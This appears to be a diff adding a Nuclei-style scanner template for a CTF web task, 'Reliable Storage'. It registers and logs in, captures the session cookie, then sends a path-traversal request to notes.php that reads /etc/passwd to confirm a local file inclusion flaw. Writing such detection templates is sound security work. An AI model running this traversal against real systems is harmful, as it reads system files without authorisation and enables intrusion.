@@ -1,0 +1,66 @@
+id: duckerz_web_ReliableStorage_easy
+
+info:
+  name: Detect vuln for Reliable Storage
+  author: Bb0LP
+  severity: low
+  description: Check LFI for task Reliable Storage
+  reference: http://tasks.duckerz.ru:30060/
+  tags: ctf,web,lfi
+
+http:
+  - id: register
+    raw:
+      - |
+        POST /register.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{username}}&repeat_password={{username}}
+
+    payloads:
+      username: payloads/creds.txt
+
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: login
+    raw:
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{username}}&password={{username}}
+    extractors:
+      - type: regex
+        name: session_token
+        part: header
+        internal: true
+        regex:
+          - "Set-Cookie: (PHPSESSID=[^;]+)"
+
+    payloads:
+      username: payloads/creds.txt
+
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: access-notes
+    raw:
+      - |
+        GET /notes.php?download=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{session_token}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:x:0:0:"
+      - type: status
+        status:
+          - 200
